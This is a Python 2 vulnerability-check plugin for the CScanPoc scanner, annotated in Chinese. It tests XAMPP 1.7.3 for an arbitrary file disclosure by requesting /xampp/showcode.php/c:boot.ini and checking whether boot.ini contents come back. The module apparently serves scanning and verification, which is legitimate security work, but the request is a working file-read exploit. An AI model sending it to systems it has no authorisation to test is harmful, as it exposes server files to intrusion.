# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'XAMPP_0101' # 平台漏洞编号，留空
    name = 'XAMPP 1.7.3 /xampp/showcode.php 任意文件' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-10-21'  # 漏洞公布时间
    desc = '''
    XAMPP <=1.7.3 has a file disclosure Vul. attacker can read any files on web server.
    ''' # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/15370/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'XAMPP'  # 漏洞应用名称
    product_version = '1.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '359c84d7-7926-4d56-b7f8-605d849ef705' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target + '/xampp/showcode.php/c:boot.ini?showcode=1'
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "<textarea cols='100' rows='10'>[boot loader]" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()